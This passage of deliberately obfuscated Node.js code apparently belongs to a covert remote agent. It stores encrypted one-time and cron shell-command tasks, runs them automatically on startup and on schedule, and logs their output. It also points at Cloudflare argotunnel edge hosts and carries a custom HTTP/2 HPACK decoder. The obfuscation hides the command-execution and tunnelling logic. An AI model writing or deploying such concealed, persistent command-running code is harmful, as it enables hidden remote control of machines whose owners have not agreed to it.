        } catch (n) {
            return a0Z[cz(0x114)]('加载失败:\x20' + n[cz(0x56d)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0aX(0x114)](a) {
        const cA = a0aX;
        try {
            const b = a0Z[cA(0x602)];
            if (b[cA(0x785)] && a0l['existsSync'](b[cA(0x785)])) {
                const c = b[cA(0x785)] + cA(0x753) + Date[cA(0x1d8)]();
                a0l['renameSync'](b['path'], c), a0D[cA(0x2ca)]('[TaskStore]\x20❌\x20' + a + cA(0x150) + c);
            } else
                a0D[cA(0x2ca)](cA(0x193) + a);
        } catch (d) {
            a0D[cA(0x2ca)]('[TaskStore]\x20❌\x20' + a + cA(0x191) + d['message']);
        }
    }
    static ['save'](a, b) {
        const cB = a0aX, c = {
                'fbIYo': function (g, h) {
                    return g || h;
                },
                'WKMej': cB(0x66b)
            }, d = a0Z[cB(0x602)];
        if (!d[cB(0x3d5)] || d[cB(0x4c2)])
            return ![];
        let f = null;
        try {
            const g = {
                    'magic': a0Z[cB(0x570)],
                    'version': a0Z[cB(0x23a)],
                    'saved_at': new Date()[cB(0x444)]()[cB(0x884)](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': c[cB(0x197)](b, {})
                    }
                }, h = a0Z[cB(0x3f4)](d['key'], JSON[cB(0x7cb)](g));
            return a0l[cB(0x568)](a0o[cB(0x664)](d['path']), { 'recursive': !![] }), f = d[cB(0x785)] + cB(0x185) + process['pid'], a0l[cB(0x78f)](f, h, c[cB(0x89d)]), a0l[cB(0x2d8)](f, d[cB(0x785)]), d[cB(0x15b)] = g[cB(0x2f7)], !![];
        } catch (i) {
            a0D['error'](cB(0x6f3) + i[cB(0x56d)]);
            try {
                if (f && a0l['existsSync'](f))
                    a0l['unlinkSync'](f);
            } catch (j) {
            }
            return ![];
        }
    }
}
class a0a0 {
    static ['cronJobs'] = new Map();
    static [a0aX(0x35f)](a, b) {
        const cC = a0aX, c = {
                'nyrJs': function (d, f) {
                    return d > f;
                }
            };
        a[cC(0x4a7)](b), c[cC(0x1e9)](a[cC(0x38d)], a0P['MAX_TASK_LOG_SIZE']) && a[cC(0x1c1)](0x0, a[cC(0x38d)] - a0P[cC(0x231)]);
    }
    static [a0aX(0x2c1)](a, b, c, d, f = null) {
        const cD = a0aX, g = new Date()[cD(0x444)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cD(0x598) + a + cD(0x36f) + c + '\x0a' + (b?.[cD(0x1c8)]() || '')
        };
    }
    static ['getOnetimeTasks']() {
        const cE = a0aX;
        return {
            'status': 'ok',
            'count': a0P[cE(0x139)][cE(0x38d)],
            'tasks': a0P[cE(0x139)]
        };
    }
    static async [a0aX(0x188)](a) {
        const cF = a0aX, b = {
                'lVqxa': function (d, f) {
                    return d < f;
                },
                'bOzbK': 'onetime',
                'kmqgw': function (d, f) {
                    return d === f;
                },
                'BHWzS': cF(0x2ca)
            };
        a0P[cF(0x139)] = a || [];
        const c = [];
        if (a0P[cF(0x635)] && a0P[cF(0x139)]['length'] > 0x0) {
            for (let d = 0x0; b[cF(0x29c)](d, a0P[cF(0x139)][cF(0x38d)]); d++) {
                const f = a0P[cF(0x139)][d], g = await a0V[cF(0x52e)](f), h = this['_formatLogEntry'](f, g[cF(0x395)], g[cF(0x484)], b[cF(0x7a8)]);
                this['_appendLog'](a0P['onetimetasks_log'], h), c['push']({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[cF(0x484)],
                    'output': g[cF(0x395)],
                    'status': b[cF(0x179)](g[cF(0x484)], 0x0) ? 'ok' : b[cF(0x791)]
                });
            }
            a0P[cF(0x635)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P['onetasks'][cF(0x38d)],
            'tasks': a0P[cF(0x139)],
            'executed': c,
            'persisted': a0Z['save'](a0P[cF(0x139)], a0P[cF(0x21c)])
        };
    }
    static ['getCronTasks']() {
        const cG = a0aX;
        return {
            'status': 'ok',
            'count': Object[cG(0x524)](a0P[cG(0x21c)])[cG(0x38d)],
            'tasks': a0P[cG(0x21c)]
        };
    }
    static [a0aX(0x516)](a) {
        const cH = a0aX, b = {
                'jRtnT': function (d, f) {
                    return d === f;
                },
                'xkubw': cH(0x468),
                'ZYkHm': function (d, f) {
                    return d === f;
                },
                'AYImt': 'cron',
                'fspQb': function (d, f) {
                    return d - f;
                },
                'WrZEx': function (d, f) {
                    return d || f;
                },
                'rMkvx': function (d, f) {
                    return d > f;
                }
            };
        this[cH(0x15d)][cH(0x836)](d => {
            const cI = cH;
            b[cI(0x453)](typeof d[cI(0x885)], b['xkubw']) && d['stop'](), b[cI(0x42a)](typeof d['destroy'], b[cI(0x6b8)]) && d[cI(0x56e)]();
        }), this['cronJobs'][cH(0x78c)]();
        const c = [];
        for (const d of Object[cH(0x524)](a || {})) {
            !a0t[cH(0x5a4)](d) && c[cH(0x4a7)](d);
        }
        if (c['length'] > 0x0)
            return {
                'status': cH(0x2ca),
                'message': cH(0x226) + c['join'](',\x20'),
                'valid_count': b[cH(0x593)](Object[cH(0x524)](b[cH(0x6c3)](a, {}))[cH(0x38d)], c['length'])
            };
        a0P[cH(0x21c)] = b[cH(0x6c3)](a, {});
        for (const [f, g] of Object['entries'](a0P[cH(0x21c)])) {
            const h = a0t[cH(0x29a)](f, async () => {
                const cJ = cH, i = await a0V[cJ(0x52e)](g), j = this[cJ(0x2c1)](g, i[cJ(0x395)], i[cJ(0x484)], b[cJ(0x6a3)], f);
                this[cJ(0x35f)](a0P[cJ(0x7f7)], j);
            });
            this['cronJobs'][cH(0x51f)](f, h);
        }
        return a0P[cH(0x165)] = b['rMkvx'](Object[cH(0x524)](a0P[cH(0x21c)])[cH(0x38d)], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0P[cH(0x21c)])[cH(0x38d)],
            'tasks': a0P[cH(0x21c)],
            'persisted': a0Z[cH(0x181)](a0P[cH(0x139)], a0P[cH(0x21c)])
        };
    }
    static ['getTaskStatus']() {
        const cK = a0aX;
        return {
            'onetime': {
                'pending': a0P[cK(0x635)],
                'count': a0P[cK(0x139)][cK(0x38d)]
            },
            'cron': {
                'active': a0P['cronloop'],
                'count': Object[cK(0x524)](a0P['crontasks'])[cK(0x38d)],
                'check_interval': a0P[cK(0x6ac)]
            },
            'persistence': {
                'enabled': a0Z[cK(0x602)][cK(0x3d5)],
                'store_path': a0Z[cK(0x602)][cK(0x785)],
                'last_saved_at': a0Z[cK(0x602)][cK(0x15b)]
            }
        };
    }
    static [a0aX(0x260)](a = 0x32) {
        const cL = a0aX, b = a0P[cL(0x1e8)][cL(0x6fd)](-a);
        return {
            'status': 'ok',
            'count': b[cL(0x38d)],
            'logs': b
        };
    }
    static [a0aX(0x67c)](a = 0x32) {
        const cM = a0aX, b = a0P[cM(0x7f7)][cM(0x6fd)](-a);
        return {
            'status': 'ok',
            'count': b[cM(0x38d)],
            'logs': b
        };
    }
    static [a0aX(0x143)]() {
        const cN = a0aX, a = a0P[cN(0x1e8)][cN(0x38d)];
        return a0P['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': cN(0x241)
        };
    }
    static [a0aX(0x5ba)]() {
        const cO = a0aX, a = a0P[cO(0x7f7)]['length'];
        return a0P[cO(0x7f7)] = [], {
            'status': 'ok',
            'cleared': cO(0x5f0)
        };
    }
    static ['getLogSummary']() {
        const cP = a0aX, a = {
                'IXrku': function (g, h) {
                    return g - h;
                }
            }, b = a0P['onetimetasks_log'][cP(0x597)](g => g['exitcode'] === 0x0)[cP(0x38d)], c = a['IXrku'](a0P[cP(0x1e8)]['length'], b), d = a0P[cP(0x7f7)]['filter'](g => g[cP(0x484)] === 0x0)['length'], f = a0P[cP(0x7f7)][cP(0x38d)] - d;
        return {
            'onetime': {
                'total_logged': a0P['onetimetasks_log'][cP(0x38d)],
                'max_capacity': a0P['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P[cP(0x7f7)][cP(0x38d)],
                'max_capacity': a0P[cP(0x231)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aX(0x55e)]() {
        const cQ = a0aX, a = { 'gaTRy': cQ(0x241) }, b = [];
        for (let c = 0x0; c < a0P[cQ(0x139)][cQ(0x38d)]; c++) {
            const d = a0P[cQ(0x139)][c], f = await a0V[cQ(0x52e)](d), g = this[cQ(0x2c1)](d, f[cQ(0x395)], f[cQ(0x484)], a[cQ(0x385)]);
            this[cQ(0x35f)](a0P[cQ(0x1e8)], g), b[cQ(0x4a7)]({
                'cmd': d,
                'exitcode': f[cQ(0x484)],
                'output': f['result'],
                'timeout': f[cQ(0x880)]
            });
        }
        return a0P[cQ(0x635)] = ![], {
            'status': 'ok',
            'executed': b[cQ(0x38d)],
            'results': b
        };
    }
    static [a0aX(0x456)]() {
        const cR = a0aX, a = {
                'pdMKL': function (c, d) {
                    return c > d;
                }
            };
        a0Z['init']();
        const b = a0Z[cR(0x86e)]();
        b[cR(0x139)][cR(0x38d)] > 0x0 && (a0P[cR(0x139)] = b[cR(0x139)]);
        if (Object[cR(0x524)](b[cR(0x21c)])[cR(0x38d)] > 0x0)
            try {
                a0a0[cR(0x516)](b[cR(0x21c)]);
            } catch (c) {
                a0D[cR(0x2ca)](cR(0x6c5) + c[cR(0x56d)]);
            }
        a[cR(0x59a)](a0P[cR(0x139)][cR(0x38d)], 0x0) && a0P['InitTask'] && a0a0['executeOnetimeTasks']()[cR(0x237)](d => a0D[cR(0x2ca)](cR(0x70a) + d[cR(0x56d)]));
    }
}
const a0a1 = a0aX(0x6b5), a0a2 = ((() => {
        const cS = a0aX, a = {
                'BcGqG': function (c, d) {
                    return c(d);
                },
                'kNmfI': function (c, d) {
                    return c > d;
                },
                'IoLux': 'region2.v2.argotunnel.com'
            }, b = a[cS(0x198)](String, process.env.KISAMA_EDGE_HOSTS || '')[cS(0x622)](',')['map'](c => c['trim']())[cS(0x597)](Boolean);
        return a[cS(0x124)](b[cS(0x38d)], 0x0) ? b : [
            cS(0x68c),
            a[cS(0x1c0)]
        ];
    })()), a0a3 = 0x1ea4, a0a4 = a0aX(0x2b0), a0a5 = a0aX(0x34d), a0a6 = 0x4000, a0a7 = [
        [
            ':authority',
            ''
        ],
        [
            a0aX(0x594),
            a0aX(0x3a1)
        ],
        [
            a0aX(0x594),
            'POST'
        ],
        [
            ':path',
            '/'
        ],
        [
            a0aX(0x14b),
            '/index.html'
        ],
        [
            a0aX(0x865),
            a0aX(0x2e1)
        ],
        [
            a0aX(0x865),
            a0aX(0x4f8)
        ],
        [
            a0aX(0x402),
            a0aX(0x5eb)
        ],
        [
            ':status',
            '204'
        ],
        [
            a0aX(0x402),
            a0aX(0x1b3)
        ],
        [
            ':status',
            a0aX(0x7d7)
        ],
        [
            ':status',
            a0aX(0x16f)
        ],
        [
            ':status',
            '404'
        ],
        [
            a0aX(0x402),
            '500'
        ],
        [
            a0aX(0x1d7),
            ''
        ],
        [
            a0aX(0x3ee),
            a0aX(0x65c)
        ],
        [
            a0aX(0x46b),
            ''
        ],
        [
            a0aX(0x137),
            ''
        ],
        [
            a0aX(0x1cd),
            ''
        ],
        [
            a0aX(0x393),
            ''
        ],
        [
            a0aX(0x648),
            ''
        ],
        [
            'allow',
            ''
        ],
        [
            a0aX(0x2b5),
            ''
        ],
        [
            a0aX(0x596),
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            a0aX(0x302),
            ''
        ],
        [
            a0aX(0x146),
            ''
        ],
        [
            'content-length',
            ''
        ],
        [
            a0aX(0x6d6),
            ''
        ],
        [
            a0aX(0x859),
            ''
        ],
        [
            a0aX(0x474),
            ''
        ],
        [
            a0aX(0x65f),
            ''
        ],
        [
            a0aX(0x652),
            ''
        ],
        [
            a0aX(0x3b6),
            ''
        ],
        [
            a0aX(0x799),
            ''
        ],
        [
            a0aX(0x73f),
            ''
        ],
        [
            a0aX(0x3a5),
            ''
        ],
        [
            'host',
            ''
        ],
        [
            a0aX(0x438),
            ''
        ],
        [
            a0aX(0x7be),
            ''
        ],
        [
            a0aX(0x6ce),
            ''
        ],
        [
            a0aX(0x6a1),
            ''
        ],
        [
            a0aX(0x3fb),
            ''
        ],
        [
            'last-modified',
            ''
        ],
        [
            'link',
            ''
        ],
        [
            a0aX(0x802),
            ''
        ],
        [
            a0aX(0x436),
            ''
        ],
        [
            'proxy-authenticate',
            ''
        ],
        [
            a0aX(0x6ba),
            ''
        ],
        [
            a0aX(0x55f),
            ''
        ],
        [
            'referer',
            ''
        ],
        [
            a0aX(0x686),
            ''
        ],
        [
            a0aX(0x75d),
            ''
        ],
        [
            'server',
            ''
        ],
        [
            a0aX(0x281),
            ''
        ],
        [
            a0aX(0x62a),
            ''
        ],
        [
            a0aX(0x4cd),
            ''
        ],
        [
            a0aX(0x559),
            ''
        ],
        [
            a0aX(0x78d),
            ''
        ],
        [
            a0aX(0x896),
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0a8 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a9 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0aa() {
    const cT = a0aX, a = {
            'KHKOJ': function (c, d) {
                return c < d;
            },
            'RRYDe': function (c, d) {
                return c >= d;
            },
            'cYPGf': function (c, d) {
                return c & d;
            },
            'LMjNF': function (c, d) {
                return c >> d;
            },
            'jyovv': function (c, d) {
                return c === d;
            },
            'imzIj': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a['KHKOJ'](c, a0a8[cT(0x38d)]); c++) {
        const d = a0a8[c], f = a0a9[c];
        let g = b;
        for (let h = f - 0x1; a[cT(0x68b)](h, 0x0); h--) {
            const i = a[cT(0x592)](a[cT(0x25e)](d, h), 0x1);
            a[cT(0x40d)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a['imzIj'](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ab = a0aa();
function a0ac(a) {
    const cU = a0aX, b = {
            'iTSnA': function (h, i) {
                return h | i;
            },
            'Shgxs': function (h, i) {
                return h === i;
            },
            'gOqQP': cU(0x58b),
            'vPoVv': function (h, i) {
                return h >= i;
            },
            'nieUd': function (h, i) {
                return h === i;
            },
            'DApah': function (h, i) {
                return h !== i;
            },
            'NbSeS': function (h, i) {
                return h - i;
            },
            'gINaX': function (h, i) {
                return h << i;
            }
        }, c = [];
    let d = a0ab, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; i >= 0x0; i--) {
            const j = h >> i & 0x1;
            f = b[cU(0x50a)](f << 0x1, j), g += 0x1, d = d[j];
            if (b[cU(0x18d)](d, null))
                throw new Error(b['gOqQP']);
            if (b[cU(0x76c)](d[0x2], 0x0)) {
                const k = cU(0x54d)[cU(0x622)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        d = a0ab;
                        continue;
                    case '1':
                        if (b[cU(0x3d8)](d[0x2], 0x100))
                            throw new Error('HPACK\x20Huffman\x20EOS\x20inside\x20string');
                        continue;
                    case '2':
                        f = 0x0;
                        continue;
                    case '3':
                        g = 0x0;
                        continue;
                    case '4':
                        c[cU(0x4a7)](d[0x2]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[cU(0x26c)](f, b['NbSeS'](b[cU(0x6e3)](0x1, g), 0x1)))
        throw new Error(cU(0x870));
    return Buffer[cU(0x3a5)](c);
}
function a0ad(a, b, c) {
    const cV = a0aX, d = {
            'toJZm': function (j, k) {
                return j - k;
            },
            'psiBU': function (j, k) {
                return j << k;
            },
            'vdSAP': function (j, k) {
                return j & k;
            },
            'iDzLq': function (j, k) {
                return j < k;
            },
            'cRroY': function (j, k) {
                return j >= k;
            },
            'IJgxU': function (j, k) {
                return j * k;
            },
            'xiDUC': function (j, k) {
                return j === k;
            },
            'QPpZi': function (j, k) {
                return j & k;
            },
            'shzxd': function (j, k) {
                return j > k;
            },
            'dzUXA': 'HPACK\x20integer\x20too\x20large'
        };
    if (b >= a[cV(0x38d)])
        throw new Error(cV(0x581));
    const f = a[b];
    b += 0x1;
    const g = d[cV(0x1cc)](d['psiBU'](0x1, c), 0x1);
    let h = d['vdSAP'](f, g);
    if (d[cV(0x546)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[cV(0x8a0)](b, a[cV(0x38d)]))
            throw new Error('truncated\x20HPACK\x20integer');
        const j = a[b];
        b += 0x1, h += d[cV(0x255)](d[cV(0x83c)](j, 0x7f), Math['pow'](0x2, i));
        if (d[cV(0x58c)](d['QPpZi'](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[cV(0x1e0)](i, 0x1c))
            throw new Error(d['dzUXA']);
    }
}
function a0ae(a, b) {
    const cW = a0aX, c = {
            'MUMCF': cW(0x2c6),
            'tnzDk': function (j, k) {
                return j & k;
            },
            'PgmYA': function (j, k) {
                return j > k;
            },
            'hjryQ': cW(0x6ff),
            'rfHzY': function (j, k) {
                return j(k);
            }
        };
    if (b >= a[cW(0x38d)])
        throw new Error(c[cW(0x5f9)]);
    const d = Boolean(c['tnzDk'](a[b], 0x80)), [f, g] = a0ad(a, b, 0x7), h = g + f;
    if (c[cW(0x431)](h, a[cW(0x38d)]))
        throw new Error(c[cW(0x5c7)]);
    const i = a[cW(0x6aa)](g, h);
    return [
        d ? c[cW(0x1a7)](a0ac, i) : i,
        h
    ];
}
class a0af {
    constructor() {
        const cX = a0aX;
        this[cX(0x3a4)] = [], this[cX(0x397)] = 0x0, this[cX(0x32b)] = 0x1000;
    }
    ['tableEntry'](a) {
        const cY = a0aX, b = {
                'bZuCP': function (d, f) {
                    return d <= f;
                },
                'GFWRI': cY(0x6f2),
                'nhZmO': function (d, f) {
                    return d - f;
                },
                'JFtWM': function (d, f) {
                    return d - f;
                },
                'NneJe': function (d, f) {
                    return d < f;
                },
                'oCRlE': function (d, f) {
                    return d >= f;
                }
            };
        if (b[cY(0x3df)](a, 0x0))
            throw new Error(b[cY(0x567)]);
        if (b[cY(0x3df)](a, a0a7[cY(0x38d)]))
            return a0a7[b[cY(0x6a9)](a, 0x1)];
        const c = b[cY(0x6a9)](b[cY(0x3a7)](a, a0a7[cY(0x38d)]), 0x1);
        if (b[cY(0x350)](c, 0x0) || b['oCRlE'](c, this[cY(0x3a4)][cY(0x38d)]))
            throw new Error('HPACK\x20dynamic\x20index\x20out\x20of\x20range');
        return this[cY(0x3a4)][c];
    }
    [a0aX(0x6c8)](a, b) {
        const cZ = a0aX, c = {
                'xLAnY': function (f, g) {
                    return f + g;
                },
                'GRMPX': 'utf8',
                'TOirj': function (f, g) {
                    return f > g;
                },
                'wLeeA': function (f, g) {
                    return f > g;
                }
            }, d = c['xLAnY'](c['xLAnY'](0x20, Buffer[cZ(0x21a)](a, c[cZ(0x607)])), Buffer[cZ(0x21a)](b, 'utf8'));
        if (d > this[cZ(0x32b)]) {
            this[cZ(0x3a4)] = [], this[cZ(0x397)] = 0x0;
            return;
        }
        while (c[cZ(0x630)](this[cZ(0x3a4)][cZ(0x38d)], 0x0) && c[cZ(0x477)](this[cZ(0x397)] + d, this['maxSize'])) {
            const [f, g] = this[cZ(0x3a4)][cZ(0x321)]();
            this[cZ(0x397)] -= c[cZ(0x849)](0x20 + Buffer['byteLength'](f, cZ(0x66b)), Buffer[cZ(0x21a)](g, c[cZ(0x607)]));
        }
        this[cZ(0x3a4)]['unshift']([
            a,
            b
        ]), this[cZ(0x397)] += d;
    }
    [a0aX(0x605)](a) {
        const d0 = a0aX, b = {
                'UFEIK': function (f, g) {
                    return f < g;
                },
                'UdRbO': function (f, g) {
                    return f & g;
                },
                'fSEdb': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'ngvHq': function (f, g) {
                    return f & g;
                },
                'jthZL': function (f, g, h) {
                    return f(g, h);
                },
                'yaWXY': d0(0x66b),
                'PpNrI': function (f, g) {
                    return f > g;
                },
                'DhkID': 'HPACK\x20table\x20size\x20exceeds\x20limit',
                'WywQM': function (f, g) {
                    return f + g;
                },
                'lZasK': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'KgRYy': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b['UFEIK'](d, a[d0(0x38d)])) {
            const f = a[d];
            if (b[d0(0x3b0)](f, 0x80)) {
                let j;
                [j, d] = b[d0(0x205)](a0ad, a, d, 0x7), c[d0(0x4a7)](this['tableEntry'](j));
                continue;
            }
            if (b[d0(0x434)](f, 0x40)) {
                let k, l;
                [k, d] = b[d0(0x205)](a0ad, a, d, 0x6);
                if (k)
                    l = this[d0(0x514)](k)[0x0];
                else {
                    let o;
                    [o, d] = a0ae(a, d), l = o[d0(0x562)](d0(0x66b))[d0(0x118)]();
                }
                let m;
                [m, d] = b['jthZL'](a0ae, a, d);
                const n = m[d0(0x562)](b[d0(0x222)]);
                this[d0(0x6c8)](l, n), c[d0(0x4a7)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[d0(0x434)](f, 0x20)) {
                let p;
                [p, d] = b['fSEdb'](a0ad, a, d, 0x5);
                if (b[d0(0x7ff)](p, 0x1000))
                    throw new Error(b['DhkID']);
                this[d0(0x32b)] = p;
                while (b[d0(0x7ff)](this['dynamic']['length'], 0x0) && b[d0(0x7ff)](this[d0(0x397)], p)) {
                    const [q, r] = this[d0(0x3a4)][d0(0x321)]();
                    this[d0(0x397)] -= b['WywQM'](b[d0(0x669)](0x20, Buffer[d0(0x21a)](q, b['yaWXY'])), Buffer[d0(0x21a)](r, b['yaWXY']));
                }
                continue;
            }
            let g, h;
            [g, d] = b[d0(0x579)](a0ad, a, d, 0x4);
            if (g)
                h = this[d0(0x514)](g)[0x0];
            else {
                let s;
                [s, d] = a0ae(a, d), h = s['toString'](b[d0(0x222)])[d0(0x118)]();
            }
            let i;
            [i, d] = b[d0(0x18f)](a0ae, a, d), c[d0(0x4a7)]([
                h,
                i[d0(0x562)](b[d0(0x222)])
            ]);
